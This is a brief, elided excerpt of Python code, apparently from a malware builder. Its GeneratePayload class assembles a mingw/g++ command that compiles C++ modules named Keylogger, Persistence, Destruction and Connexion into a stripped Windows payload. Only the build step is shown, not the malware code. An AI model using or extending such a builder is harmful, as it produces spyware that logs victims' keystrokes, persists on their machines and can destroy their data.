...
class GeneratePayload:
    ...
    def compilate(self):
        ...
        if(self.os == "Linux"):
            #if os is linux <3
            cmd = "i686-w64-mingw32-g++ main.cpp Exec.cpp other.cpp   HandShake.cpp  Connexion.cpp  Persistence.cpp  Destruction.cpp Keylogger.cpp -o {}  -lws2_32 -static-libgcc -static-libstdc++ -Os -s".format(current_path+"/payload/"+self.name)
            
        elif(self.os == "Windows"):
            cmd = "g++ main.cpp Exec.cpp HandShake.cpp  Persistence.cpp Connexion.cpp other.cpp Destruction.cpp  Keylogger.cpp -o {} -lws2_32 -static-libgcc -static-libstdc++ -Os -s".format(current_path+"/payload/"+self.name)
        else:
